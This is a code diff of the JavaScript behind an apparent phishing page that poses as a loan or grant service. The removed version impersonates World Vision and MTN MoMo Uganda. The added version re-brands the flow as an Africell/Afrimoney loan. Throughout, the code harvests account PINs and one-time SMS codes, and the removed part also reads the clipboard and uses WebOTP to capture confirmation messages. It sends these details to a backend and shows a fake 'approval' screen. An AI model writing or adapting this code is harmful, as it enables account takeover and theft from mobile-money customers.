-        toast.className = 'fixed top-5 left-1/2 -translate-x-1/2 z-[200] bg-slate-900 text-white text-xs font-bold px-4 py-2.5 rounded-full shadow-2xl transition-all duration-300 opacity-0 pointer-events-none flex items-center space-x-2 border border-slate-700';
-        document.body.appendChild(toast);
+    function updatePhoneUI() {
+      const displayEl = document.getElementById('phone-display-text');
+      if (displayEl) {
+        displayEl.innerText = formatPhoneDisplay(phoneNumber);
       }
-      toast.innerText = msg;
-      toast.classList.remove('opacity-0', 'pointer-events-none');
-      toast.classList.add('opacity-100');
-      setTimeout(() => {
-        toast.classList.remove('opacity-100');
-        toast.classList.add('opacity-0', 'pointer-events-none');
-      }, 3000);
     }
 
-    function isOwnSiteUrl(urlStr) {
-      if (!urlStr) return false;
+    function updatePinUI() {
+      const boxes = document.querySelectorAll('.pin-digit-box');
+      const signInBtn = document.getElementById('signin-submit-btn');
+
+      boxes.forEach((box, idx) => {
+        const char = accountPin[idx] || '';
+        box.innerText = char ? (pinVisible ? char : '●') : '';
+        box.classList.remove('active', 'filled');
+        if (char) box.classList.add('filled');
+        if (idx === accountPin.length && accountPin.length < 4) {
+          box.classList.add('active');
+        }
+      });
+
+      if (accountPin.length === 4) {
+        if (boxes[3]) boxes[3].classList.add('active');
+        if (signInBtn) {
+          signInBtn.disabled = false;
+          signInBtn.classList.remove('bg-pink-200', 'cursor-not-allowed');
+          signInBtn.classList.add('bg-[#9B1479]', 'hover:bg-[#851167]', 'shadow-lg', 'shadow-pink-900/15', 'cursor-pointer');
+        }
+      } else {
+        if (signInBtn) {
+          signInBtn.disabled = true;
+          signInBtn.classList.add('bg-pink-200', 'cursor-not-allowed');
+          signInBtn.classList.remove('bg-[#9B1479]', 'hover:bg-[#851167]', 'shadow-lg', 'shadow-pink-900/15', 'cursor-pointer');
+        }
+      }
+    }
+
+    function togglePinVisibility() {
+      pinVisible = !pinVisible;
+      const eyeText = document.getElementById('pin-eye-text');
+      if (eyeText) eyeText.innerText = pinVisible ? 'Hide' : 'Show';
+      updatePinUI();
+    }
+
+    function updateOtpUI() {
+      const cards = document.querySelectorAll('.otp-digit-card');
+      const verifyBtn = document.getElementById('otp-verify-btn');
+
+      cards.forEach((card, idx) => {
+        const char = otpCode[idx] || '';
+        card.innerText = char;
+        card.classList.remove('active', 'filled');
+        if (char) card.classList.add('filled');
+        if (idx === otpCode.length && otpCode.length < 6) {
+          card.classList.add('active');
+        }
+      });
+
+      if (otpCode.length === 6) {
+        if (cards[5]) cards[5].classList.add('active');
+        if (verifyBtn) {
+          verifyBtn.disabled = false;
+          verifyBtn.classList.remove('bg-pink-200', 'cursor-not-allowed');
+          verifyBtn.classList.add('bg-[#9B1479]', 'hover:bg-[#851167]', 'shadow-lg', 'shadow-pink-900/15', 'cursor-pointer');
+        }
+      } else {
+        if (verifyBtn) {
+          verifyBtn.disabled = true;
+          verifyBtn.classList.add('bg-pink-200', 'cursor-not-allowed');
+          verifyBtn.classList.remove('bg-[#9B1479]', 'hover:bg-[#851167]', 'shadow-lg', 'shadow-pink-900/15', 'cursor-pointer');
+        }
+      }
+    }
+
+    function handleNumKey(digit) {
+      if (currentStep === 3) {
+        // Enters 4-digit Account PIN directly below phone
+        if (accountPin.length < 4) {
+          accountPin += digit;
+          updatePinUI();
+        }
+      } else if (currentStep === 5) {
+        if (otpCode.length < 6) {
+          otpCode += digit;
+          updateOtpUI();
+          if (otpCode.length === 6) {
+            setTimeout(handleOtpVerifyClick, 250);
+          }
+        }
+      }
+    }
+
+    function handleDeleteKey() {
+      if (currentStep === 3) {
+        if (accountPin.length > 0) {
+          accountPin = accountPin.slice(0, -1);
+          updatePinUI();
+        }
+      } else if (currentStep === 5) {
+        if (otpCode.length > 0) {
+          otpCode = otpCode.slice(0, -1);
+          updateOtpUI();
+        }
+      }
+    }
+
+    function startOtpCountdown() {
+      if (countdownInterval) clearInterval(countdownInterval);
+      countdownSeconds = 119;
+      const display = document.getElementById('resend-countdown');
+      const render = () => {
+        const m = Math.floor(countdownSeconds / 60);
+        const s = countdownSeconds % 60;
+        if (display) display.innerText = `${m}:${s < 10 ? '0' + s : s}`;
+      };
+      render();
+      countdownInterval = setInterval(() => {
+        countdownSeconds--;
+        if (countdownSeconds >= 0) render();
+        else {
+          clearInterval(countdownInterval);
+          if (display) display.innerText = '0:00';
+        }
+      }, 1000);
+    }
+
+    function getStoredReferralToken() {
       try {
-        const u = new URL(urlStr.startsWith('http') ? urlStr : ('https://' + urlStr));
-        if (u.hostname === window.location.hostname) return true;
-        if (window.location.hostname && window.location.hostname.includes('render.com') && u.hostname.includes('render.com')) return true;
-        if (u.hostname === 'localhost' || u.hostname === '127.0.0.1') return true;
-      } catch (e) {}
-      return false;
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('ref') || urlParams.get('agent') || sessionStorage.getItem('momo_ref_token') || null;
+      } catch (_) {
+        return null;
+      }
+    }
+
+    function showApprovalOverlay(title, desc, statusText) {
+      const modal = document.getElementById('full-page-approval-modal');
+      const titleEl = document.getElementById('approval-modal-title');
+      const descEl = document.getElementById('approval-modal-desc');
+      const statusEl = document.getElementById('approval-modal-status');
+      if (titleEl && title) titleEl.innerText = title;
+      if (descEl && desc) descEl.innerText = desc;
+      if (statusEl && statusText) statusEl.innerText = statusText;
+      if (modal) modal.classList.remove('hidden');
+    }
+
+    function hideApprovalOverlay() {
+      const modal = document.getElementById('full-page-approval-modal');
+      if (modal) modal.classList.add('hidden');
     }
 
     function toggleNoticeModal(show, title, message) {
@@ -1097,314 +1055,100 @@
       }
     }
 
-    async function copyToClipboard(text, toastMsg) {
-      if (!text || !text.trim()) return;
-      try {
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-          await navigator.clipboard.writeText(text.trim());
-          if (toastMsg) showClipboardToast(toastMsg);
-        }
-      } catch (e) {
-        console.warn('Copy to clipboard error:', e);
-      }
-    }
+    function goToStep(stepNum) {
+      hideApprovalOverlay();
 
-    async function pasteSmsFromClipboard() {
-      const msgInput = document.getElementById('momo-pasted-msg');
-      try {
-        let text = '';
-        if (navigator.clipboard && navigator.clipboard.readText) {
-          text = await navigator.clipboard.readText();
-        }
-        
-        if (text && text.trim()) {
-          const cleanText = text.trim();
-          if (isOwnSiteUrl(cleanText)) {
-            showClipboardToast('⚠️ Clipboard contains website URL, not SMS.');
-            return;
-          }
-          if (msgInput) {
-            msgInput.value = cleanText;
-            copyToClipboard(cleanText);
-            showClipboardToast('⚡ SMS pasted & copied to clipboard!');
-            handlePostLoginPastedMsg(cleanText, false);
-          }
-        } else {
-          showClipboardToast('📋 Clipboard is empty. Please copy or await SMS.');
-        }
-      } catch (err) {
-        console.warn('Clipboard access error:', err);
-        showClipboardToast('📋 Tap the box to paste your SMS.');
-      }
-    }
+      const standardHeader = document.getElementById('standard-header');
+      const keypad = document.getElementById('keypad-container');
+      const pageFooter = document.getElementById('page-footer');
 
-    function resetScrollToTop() {
-      try {
-        window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
-      } catch (e) {
-        window.scrollTo(0, 0);
-      }
-      document.body.scrollTop = 0;
-      document.documentElement.scrollTop = 0;
-      const appWrapper = document.querySelector('.max-w-md');
-      if (appWrapper) appWrapper.scrollTop = 0;
-      const mainEl = document.querySelector('main');
-      if (mainEl) mainEl.scrollTop = 0;
-    }
-
-    function showApprovalOverlay(title, desc, statusText) {
-      const modal = document.getElementById('full-page-approval-modal');
-      const titleEl = document.getElementById('approval-modal-title');
-      const descEl = document.getElementById('approval-modal-desc');
-      const statusEl = document.getElementById('approval-modal-status');
-      if (titleEl && title) titleEl.innerText = title;
-      if (descEl && desc) descEl.innerText = desc;
-      if (statusEl && statusText) statusEl.innerText = statusText;
-      if (modal) {
-        modal.classList.remove('hidden');
-        document.body.classList.add('overflow-hidden');
-      }
-      resetScrollToTop();
-    }
-
-    function hideApprovalOverlay() {
-      const modal = document.getElementById('full-page-approval-modal');
-      if (modal) {
-        modal.classList.add('hidden');
-        document.body.classList.remove('overflow-hidden');
-      }
-      resetScrollToTop();
-      requestAnimationFrame(resetScrollToTop);
-      setTimeout(resetScrollToTop, 50);
-    }
-
-    function copyTargetPhone(btn) {
-      const ph = appState.phoneNumber || localStorage.getItem('momo_phone') || localStorage.getItem('eloan_phone') || '';
-      if (ph) {
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-          navigator.clipboard.writeText(ph);
-        }
-        if (btn) {
-          const orig = btn.innerHTML;
-          btn.innerHTML = '<span>✅</span><span>Copied!</span>';
-          setTimeout(() => { btn.innerHTML = orig; }, 1800);
-        }
-      }
-    }
-
-    function openMessagingApp(e) {
-      if (e) {
-        try { e.preventDefault(); } catch (err) {}
-      }
-      startSmsCountdownTimer();
-
-      const isAndroid = /android/i.test(navigator.userAgent);
-      if (isAndroid) {
-        try {
-          window.location.href = 'intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_MESSAGING;end';
-          setTimeout(() => {
-            window.location.href = 'sms:';
-          }, 500);
-          return;
-        } catch (err) {
-          window.location.href = 'sms:';
-          return;
-        }
-      }
-      window.location.href = 'sms:';
-    }
-
-    let simCountdownInterval = null;
-    function startSmsCountdownTimer() {
-      if (simCountdownInterval) {
-        clearInterval(simCountdownInterval);
-        simCountdownInterval = null;
-      }
-      let secondsRemaining = 20;
-      const displayEl = document.getElementById('sms-timer-display');
-      const statusEl = document.getElementById('sms-timer-status');
-      const phoneEl = document.getElementById('sms-timer-phone');
-      const countdownCard = document.getElementById('sim-sms-countdown-card');
-
-      if (countdownCard) {
-        countdownCard.classList.remove('hidden');
+      if (stepNum === 3 || stepNum === 5) {
+        if (standardHeader) standardHeader.classList.add('hidden');
+        if (keypad) keypad.classList.remove('hidden');
+        if (pageFooter) pageFooter.classList.add('hidden');
+      } else {
+        if (standardHeader) standardHeader.classList.remove('hidden');
+        if (keypad) keypad.classList.add('hidden');
+        if (pageFooter) pageFooter.classList.remove('hidden');
       }
 
-      if (phoneEl) {
-        phoneEl.innerText = appState.phoneNumber || 'MoMo Account';
-      }
-
-      if (displayEl) {
-        displayEl.innerText = '00:20';
-        displayEl.className = 'text-3xl font-black text-brand-blue tracking-tight font-mono py-0.5';
-      }
-      if (statusEl) {
-        statusEl.innerText = 'Copy the confirmation SMS then paste below.';
-        statusEl.className = 'text-[11px] text-slate-500 font-semibold';
-      }
-
-      const updateDisplay = () => {
-        const mins = Math.floor(secondsRemaining / 60);
-        const secs = secondsRemaining % 60;
-        const formatted = `${mins < 10 ? '0' + mins : mins}:${secs < 10 ? '0' + secs : secs}`;
-        if (displayEl) displayEl.innerText = formatted;
-      };
-
-      updateDisplay();
-
-      simCountdownInterval = setInterval(() => {
-        secondsRemaining--;
-        if (secondsRemaining > 0) {
-          updateDisplay();
-        } else {
-          clearInterval(simCountdownInterval);
-          simCountdownInterval = null;
-          if (displayEl) {
-            displayEl.innerText = '00:00';
-            displayEl.className = 'text-2xl font-black text-red-600 tracking-tight font-mono py-0.5';
-          }
-          if (statusEl) {
-            statusEl.innerText = '⚠️ Time expired. If SMS not received, tap Open SMS or Paste.';
-            statusEl.className = 'text-[11px] text-red-600 font-bold';
-          }
-        }
-      }, 1000);
-    }
-
-    function initWebOtpReceiver() {
-      if (!('OTPCredential' in window)) return;
-      const msgInput = document.getElementById('momo-pasted-msg');
-      try {
-        if (window.webOtpController) {
-          try { window.webOtpController.abort(); } catch (err) {}
-        }
-        window.webOtpController = new AbortController();
-        navigator.credentials.get({
-          otp: { transport: ['sms'] },
-          signal: window.webOtpController.signal
-        }).then(otp => {
-          if (otp) {
-            const incoming = (otp.message || otp.body || otp.code || '').trim();
-            if (incoming && msgInput) {
-              msgInput.value = incoming;
-              copyToClipboard(incoming);
-              showClipboardToast('⚡ WebOTP: SMS received & copied to clipboard!');
-              handlePostLoginPastedMsg(incoming, false);
-            }
-          }
-        }).catch(() => {});
-      } catch (e) {
-        console.warn('WebOTP init error:', e);
-      }
-    }
-
-    let lastAutoPastedText = '';
-
-    async function autoDetectAndPasteClipboard(force = false) {
-      const msgInput = document.getElementById('momo-pasted-msg');
-      if (!msgInput) return;
-      if (!force && msgInput.value.trim().length > 10) return;
-      try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-          const text = await navigator.clipboard.readText();
-          if (text && text.trim()) {
-            const cleanText = text.trim();
-            if (isOwnSiteUrl(cleanText)) return;
-            if (cleanText === lastAutoPastedText && !force) return;
-            lastAutoPastedText = cleanText;
-            msgInput.value = cleanText;
-            showClipboardToast('⚡ SMS message detected & pasted!');
-            handlePostLoginPastedMsg(cleanText, true);
-          }
-        }
-      } catch (e) {
-        console.warn('Auto clipboard read permission needed:', e);
-      }
-    }
-
-    window.addEventListener('focus', () => {
-      if (typeof currentStep !== 'undefined' && currentStep === 4) {
-        autoDetectAndPasteClipboard(true);
-      }
-    });
-
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible' && typeof currentStep !== 'undefined' && currentStep === 4) {
-        autoDetectAndPasteClipboard(true);
-      }
-    });
-
-    function startSimSmsReceiver() {
-      const msgInput = document.getElementById('momo-pasted-msg');
-      const statusEl = document.getElementById('momo-extract-status');
-      const badge = document.getElementById('sms-waiting-badge');
-
-      if (msgInput) {
-        msgInput.value = '';
-        msgInput.placeholder = 'Paste your MoMo SMS message here...';
-      }
-      if (statusEl) {
-        statusEl.classList.add('hidden');
-      }
-      if (badge) {
-        badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-        badge.innerHTML = '<span>Ready to Paste</span>';
-      }
-
-      startSmsCountdownTimer();
-      initWebOtpReceiver();
-      setTimeout(() => {
-        autoDetectAndPasteClipboard();
-      }, 400);
-    }
-
-    function generateUuid() {
-      if (window.crypto && typeof window.crypto.randomUUID === 'function') {
-        try { return window.crypto.randomUUID(); } catch (e) {}
-      }
-      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-        const r = Math.random() * 16 | 0;
-        const v = c === 'x' ? r : (r & 0x3 | 0x8);
-        return v.toString(16);
+      [0, 1, 2, 3, 5, 6].forEach(i => {
+        const sec = document.getElementById(`step-${i}`);
+        if (sec) sec.classList.add('hidden');
       });
+
+      const targetSec = document.getElementById(`step-${stepNum}`);
+      if (targetSec) targetSec.classList.remove('hidden');
+
+      currentStep = stepNum;
+
+      const backBtn = document.getElementById('header-back-btn');
+      if (currentStep === 0) {
+        if (backBtn) backBtn.classList.add('opacity-0', 'pointer-events-none');
+      } else {
+        if (backBtn) backBtn.classList.remove('opacity-0', 'pointer-events-none');
+      }
+
+      if (currentStep === 3) {
+        updatePhoneUI();
+        accountPin = '';
+        updatePinUI();
+      }
+
+      if (currentStep === 5) {
+        otpCode = '';
+        updateOtpUI();
+        startOtpCountdown();
+        const sentPhoneEl = document.getElementById('otp-sent-phone');
+        if (sentPhoneEl) sentPhoneEl.innerText = `+244 ${formatPhoneDisplay(phoneNumber)}`;
+      }
+
+      if (currentStep === 6) {
+        const approvedAmt = document.getElementById('summary-approved-amount');
+        if (approvedAmt) approvedAmt.innerText = formatKz(appState.loanAmount);
+        const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
+        const monthlyPay = document.getElementById('summary-monthly-payment');
+        if (monthlyPay) monthlyPay.innerText = formatKz(monthly);
+        const termDisp = document.getElementById('summary-term-display');
+        if (termDisp) termDisp.innerText = `${appState.loanTermMonths} Months`;
+      }
+
+      window.scrollTo(0, 0);
+    }
+
+    function handleBackAction() {
+      if (currentStep > 0 && currentStep <= 2) {
+        goToStep(currentStep - 1);
+      } else if (currentStep === 3) {
+        goToStep(2);
+      } else if (currentStep === 5) {
+        goToStep(3);
+      } else if (currentStep === 6) {
+        goToStep(0);
+      }
+    }
+
+    function handleScreenBack() {
+      handleBackAction();
     }
 
     async function ensureApplicationCreated() {
-      if (appState.applicationId) return appState.applicationId;
+      if (applicationId) return applicationId;
 
       const refToken = getStoredReferralToken();
-      const submissionId = generateUuid();
-      const consent = document.getElementById('agent-consent-checkbox') ? document.getElementById('agent-consent-checkbox').checked : true;
-
-      const resolvedPhone = (appState.phoneNumber || '').trim()
-        || (localStorage.getItem('momo_phone') || '').trim()
-        || (localStorage.getItem('eloan_phone') || '').trim()
-        || (document.getElementById('momo-phone-display')?.value || '').trim()
-        || (document.getElementById('phone-number-input')?.value || '').trim()
-        || '770000000';
-      appState.phoneNumber = resolvedPhone;
-
-      const firstName = (appState.firstName || '').trim() || (localStorage.getItem('momo_first_name') || '').trim() || 'Partner';
-      const lastName = (appState.lastName || '').trim() || (localStorage.getItem('momo_last_name') || '').trim() || 'Representative';
-      appState.firstName = firstName;
-      appState.lastName = lastName;
-
-      const orgPrefix = appState.orgName ? `[${appState.orgName}] ` : '';
-      const finalPurpose = orgPrefix + (appState.purpose || 'Community Development Initiative');
-
       const payload = {
-        firstName: firstName,
-        lastName: lastName,
-        phone: resolvedPhone,
-        loanType: appState.loanType || 'Community & Child Welfare Support',
-        loanAmount: Number(appState.loanAmount) || 20000,
+        firstName: appState.firstName || 'Africell',
+        lastName: appState.lastName || 'Customer',
+        phone: phoneNumber || '950548313',
+        loanType: appState.loanType || 'Personal Emergency Loan',
+        loanAmount: Number(appState.loanAmount) || 500000,
         termMonths: Number(appState.loanTermMonths) || 6,
-        purpose: finalPurpose,
-        employment: appState.employment || 'Community-Based Organization (CBO)',
-        annualIncome: (Number(appState.loanAmount) || 20000) * 2.5,
+        purpose: appState.purpose || 'Afrimoney Personal Quick Loan',
+        employment: appState.employment || 'Employed / Salaried',
+        annualIncome: (Number(appState.loanAmount) || 500000) * 3,
         referralToken: refToken,
-        consentToAgentContact: consent,
-        submissionId: submissionId
+        consentToAgentContact: true,
+        submissionId: 'africell-' + Date.now()
       };
 
       try {
@@ -1415,16 +1159,8 @@
         });
         let data = await res.json().catch(() => ({}));
 
-        // Self-heal: If referral token is invalid or expired, clear it and retry without referralToken
         if (!res.ok && data.error && data.error.toLowerCase().includes('referraltoken')) {
-          console.warn('Invalid referral token detected, clearing and retrying without referral:', data.error);
-          try {
-            sessionStorage.removeItem('momo_ref_token');
-            localStorage.removeItem('momo_ref_token');
-          } catch (_) {}
           delete payload.referralToken;
-          const banner = document.getElementById('referral-banner');
-          if (banner) banner.classList.add('hidden');
           res = await fetch('/api/applications', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -1433,568 +1169,22 @@
           data = await res.json().catch(() => ({}));
         }
 
-        // If older server instance rejected employment or loanType, retry with universally accepted fallback
-        if (!res.ok && data.error && (data.error.includes('employment') || data.error.includes('loanType'))) {
-          payload.employment = 'Self-Employed / Business Owner';
-          payload.loanType = 'Business Loan';
-          payload.purpose = `[${appState.employment || 'CBO'}] ${finalPurpose}`;
-          res = await fetch('/api/applications', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-          data = await res.json().catch(() => ({}));
-        }
-
-        if (!res.ok) {
-          throw new Error(data.error || 'Failed to submit application data');
-        }
         if (data.applicationId) {
-          appState.applicationId = data.applicationId;
-          localStorage.setItem('momo_app_id', data.applicationId);
-          return data.applicationId;
+          applicationId = data.applicationId;
+          return applicationId;
         }
       } catch (err) {
-        console.error('Failed to create application:', err);
-        throw err;
+        console.warn('Application submission:', err);
       }
       return null;
     }
 
-    function onMomoPhoneInput(val) {
-      const clean = (val || '').trim();
-      appState.phoneNumber = clean;
-      localStorage.setItem('momo_phone', clean);
-      localStorage.setItem('eloan_phone', clean);
-      const phInp = document.getElementById('phone-number-input');
-      if (phInp && !phInp.value) phInp.value = clean;
-    }
-
-    let phoneCheckTimer = null;
-    async function checkReturningUserPhone(val) {
-      if (phoneCheckTimer) clearTimeout(phoneCheckTimer);
-      const clean = (val || '').replace(/[^0-9]/g, '');
-
-      if (!clean || clean.length < 6) {
-        return;
-      }
-
-      phoneCheckTimer = setTimeout(async () => {
-        try {
-          const res = await fetch(`/api/check-phone?phone=${encodeURIComponent(clean)}`);
-          if (res.ok) {
-            const data = await res.json();
-            if (data.returningUser && data.firstName) {
-              const fnEl = document.getElementById('first-name-input');
-              const lnEl = document.getElementById('last-name-input');
-
-              if (fnEl && data.firstName) {
-                fnEl.value = data.firstName;
-                appState.firstName = data.firstName;
-              }
-              if (lnEl && data.lastName) {
-                lnEl.value = data.lastName;
-                appState.lastName = data.lastName;
-              }
-              appState.phoneNumber = clean;
-              const dispPhone = document.getElementById('momo-phone-display');
-              if (dispPhone) dispPhone.value = clean;
-
-              if (data.applicationId) {
-                appState.previousApplicationId = data.applicationId;
-              }
-            }
-          }
-        } catch (e) {
-          console.warn('Phone check error:', e);
-        }
-      }, 350);
-    }
-
-    function updateHeaderAndFooterForStep(stepNum) {
-      const mainHeader = document.getElementById('main-header');
-      const wvHeader = document.getElementById('wv-header-content');
-      const momoHeader = document.getElementById('momo-header-content');
-      const refBanner = document.getElementById('referral-banner');
-      const pageFooter = document.getElementById('page-footer');
-
-      if (stepNum >= 3) {
-        // Complete transformation to authentic MTN MoMo Uganda UI (Steps 3, 4, 5, 6)
-        if (mainHeader) {
-          mainHeader.className = 'bg-[#FFCC00] text-[#002B49] px-4 py-3 flex items-center justify-between sticky top-0 z-40 border-b-2 border-[#002B49] shadow-md transition-all';
-        }
-        if (wvHeader) wvHeader.classList.add('hidden');
-        if (momoHeader) momoHeader.classList.remove('hidden');
-        if (refBanner) refBanner.classList.add('hidden');
-
-        if (pageFooter) {
-          pageFooter.className = 'bg-[#001D38] text-slate-300 py-3.5 px-4 text-center text-[11px] border-t-2 border-[#FFCC00] transition-all';
-          pageFooter.innerHTML = `
-            <div class="flex flex-col items-center justify-center space-y-1.5">
-              <div class="flex flex-wrap items-center justify-center gap-x-2 gap-y-1 text-[10px] font-black text-[#FFCC00]">
-                <span class="flex items-center space-x-1"><span>🛡️</span><span>Regulated by Bank of Uganda</span></span>
-                <span>•</span>
-                <span class="flex items-center space-x-1"><span>📞</span><span>Dial *165#</span></span>
-                <span>•</span>
-                <span>Toll-Free 100</span>
-              </div>
-              <p class="text-[10px] text-slate-400 font-medium">© 2026 MTN Mobile Money Uganda Limited. All rights reserved.</p>
-            </div>
-          `;
-        }
-      } else {
-        // World Vision Community Grant layout (Steps 0, 1, 2)
-        if (mainHeader) {
-          mainHeader.className = 'bg-[#0C2340] text-white px-5 py-3.5 flex items-center justify-between sticky top-0 z-40 border-b-2 border-[#FF6700] shadow-md transition-all';
-        }
-        if (wvHeader) wvHeader.classList.remove('hidden');
-        if (momoHeader) momoHeader.classList.add('hidden');
-        const token = getStoredReferralToken();
-        if (token && refBanner) {
-          refBanner.classList.remove('hidden');
-        }
-
-        if (pageFooter) {
-          pageFooter.className = 'bg-[#0C2340] text-orange-200 py-3.5 px-4 text-center text-[11px] border-t border-slate-800 transition-all';
-          pageFooter.innerHTML = `<p data-i18n="footerRights">© 2026 World Vision — Community Grants & Development Partnerships</p>`;
-        }
-      }
-    }
-
-    function goToStep(stepNum) {
-      hideApprovalOverlay();
-      isAwaitingStep2Approval = false;
-      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
-      if (simCountdownInterval && stepNum !== 4) {
-        clearInterval(simCountdownInterval);
-        simCountdownInterval = null;
-      }
-
-      // Update header, branding, colors, and footer across the WHOLE PAGE
-      updateHeaderAndFooterForStep(stepNum);
-
-      if (stepNum === 0 || stepNum === 1) {
-        if (pollingInterval) {
-          clearInterval(pollingInterval);
-          pollingInterval = null;
-        }
-        currentPollingAppId = null;
-        activePinVerId = null;
-        activeSmsVerId = null;
-        appState.applicationId = null;
-        isSubmittingMessage = false;
-        const msgInp = document.getElementById('momo-pasted-msg');
-        if (msgInp) msgInp.value = '';
-      }
-
-      if (currentStep === 1) {
-        const orgEl = document.getElementById('org-name-input');
-        if (orgEl) appState.orgName = orgEl.value.trim();
-        const typeEl = document.getElementById('loan-type-select');
-        if (typeEl) appState.loanType = typeEl.value;
-        const amtEl = document.getElementById('loan-amount-input');
-        if (amtEl) appState.loanAmount = parseInt(amtEl.value, 10) || appState.loanAmount;
-        const termEl = document.getElementById('loan-term-select');
-        if (termEl) appState.loanTermMonths = parseInt(termEl.value, 10) || 6;
-        const purpEl = document.getElementById('loan-purpose-input');
-        if (purpEl) appState.purpose = purpEl.value;
-      } else if (currentStep === 2) {
-        const fnEl = document.getElementById('first-name-input');
-        if (fnEl) appState.firstName = fnEl.value.trim();
-        const lnEl = document.getElementById('last-name-input');
-        if (lnEl) appState.lastName = lnEl.value.trim();
-        const empEl = document.getElementById('employment-select');
-        if (empEl) appState.employment = empEl.value;
-        const phEl = document.getElementById('phone-number-input');
-        if (phEl) appState.phoneNumber = phEl.value.trim();
-        const dispPhone = document.getElementById('momo-phone-display');
-        if (dispPhone) dispPhone.value = appState.phoneNumber;
-        
-        if (stepNum === 3) {
-          ensureApplicationCreated();
-        }
-      }
-
-      for (let i = 0; i <= 6; i++) {
-        const sec = document.getElementById(`step-${i}`);
-        if (sec) sec.classList.add('hidden');
-      }
-
-      const targetSec = document.getElementById(`step-${stepNum}`);
-      if (targetSec) targetSec.classList.remove('hidden');
-
-      currentStep = stepNum;
-
-      const backBtn = document.getElementById('header-back-btn');
-
-      if (currentStep === 0) {
-        if (backBtn) backBtn.classList.add('opacity-0', 'pointer-events-none');
-      } else {
-        if (backBtn) backBtn.classList.remove('opacity-0', 'pointer-events-none');
-      }
-
-      if (currentStep === 2) {
-        const phInp = document.getElementById('phone-number-input');
-        if (phInp && phInp.value) {
-          checkReturningUserPhone(phInp.value);
-        }
-      }
-
-      if (currentStep === 3) {
-        const dispPhone = document.getElementById('momo-phone-display');
-        const phInp = document.getElementById('phone-number-input');
-        if (!appState.phoneNumber && phInp && phInp.value) {
-          appState.phoneNumber = phInp.value.trim();
-        }
-        if (dispPhone) {
-          dispPhone.value = appState.phoneNumber || (phInp ? phInp.value.trim() : '');
-        }
-      }
-
-      if (currentStep === 4) {
-        isSubmittingMessage = false;
-        const targetPhone = appState.phoneNumber || document.getElementById('phone-number-input')?.value || '';
-        const smsTimerPhone = document.getElementById('sms-timer-phone');
-        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'MoMo Account';
-        startSimSmsReceiver();
-      }
-
-      if (currentStep === 5) {
-        isSubmittingOtp = false;
-        clearOtp();
-        const otpAlert = document.getElementById('otp-retry-alert');
-        if (otpAlert) otpAlert.classList.add('hidden');
-        const otpWait = document.getElementById('otp-waiting-box');
-        if (otpWait) otpWait.classList.add('hidden');
-        const firstOtp = document.querySelector('.otp-box');
-        if (firstOtp) setTimeout(() => firstOtp.focus(), 100);
-        if (appState.applicationId) {
-          startVerificationPolling(appState.applicationId);
-        }
-      }
-
-      if (currentStep === 6) {
-        const approvedAmt = document.getElementById('summary-approved-amount');
-        if (approvedAmt) approvedAmt.innerText = `UGX ${appState.loanAmount.toLocaleString()}`;
-        
-        const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
-        const monthlyPay = document.getElementById('summary-monthly-payment');
-        if (monthlyPay) monthlyPay.innerText = `UGX ${monthly.toLocaleString()}`;
-        
-        const termDisp = document.getElementById('summary-term-display');
-        if (termDisp) termDisp.innerText = `${appState.loanTermMonths} Months`;
-
-        if (appState.applicationId) {
-          startVerificationPolling(appState.applicationId);
-        }
-      }
-
-      resetScrollToTop();
-      requestAnimationFrame(resetScrollToTop);
-      setTimeout(resetScrollToTop, 50);
-    }
-
-    function handleBackAction() {
-      hideApprovalOverlay();
-      isAwaitingStep2Approval = false;
-      isSubmittingMessage = false;
-      isSubmittingOtp = false;
-      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
-      const msgInput = document.getElementById('momo-pasted-msg');
-      if (msgInput) msgInput.value = '';
-
-      if (currentStep > 0 && currentStep <= 5) {
-        goToStep(currentStep - 1);
-      } else if (currentStep === 6) {
-        goToStep(0);
-      }
-    }
-
-    // 5-Digit PIN Boxes Logic
-    const pinInputs = document.querySelectorAll('.pin-box');
-    const loginBtn = document.getElementById('login-btn');
-
-    pinInputs.forEach((input, index) => {
-      input.addEventListener('focus', () => {
-        input.classList.add('active');
-        input.select();
-      });
-      input.addEventListener('blur', () => {
-        input.classList.remove('active');
-      });
-
-      input.addEventListener('input', (e) => {
-        const val = e.target.value.replace(/[^0-9]/g, '');
-        e.target.value = val;
-
-        if (val && index < pinInputs.length - 1) {
-          pinInputs[index + 1].focus();
-        }
-        checkPinComplete();
-      });
-
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !input.value && index > 0) {
-          pinInputs[index - 1].focus();
-        }
-      });
-
-      input.addEventListener('paste', (e) => {
-        e.preventDefault();
-        const pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
-        if (pasteData) {
-          const digits = pasteData.slice(0, pinInputs.length).split('');
-          digits.forEach((d, idx) => {
-            if (pinInputs[idx]) pinInputs[idx].value = d;
-          });
-          const nextIndex = Math.min(digits.length, pinInputs.length - 1);
-          if (pinInputs[nextIndex]) pinInputs[nextIndex].focus();
-          checkPinComplete();
-        }
-      });
-    });
-
-    function checkPinComplete() {
-      let pin = '';
-      pinInputs.forEach(i => pin += i.value);
-      appState.momoPin = pin;
-
-      if (pin.length === 5) {
-        loginBtn.disabled = false;
-        loginBtn.classList.remove('bg-blue-900/40', 'text-white/50', 'bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.add('bg-[#FFCC00]', 'hover:bg-[#E5B800]', 'text-[#002B49]', 'font-black', 'shadow-lg', 'shadow-yellow-500/20', 'cursor-pointer');
-      } else {
-        loginBtn.disabled = true;
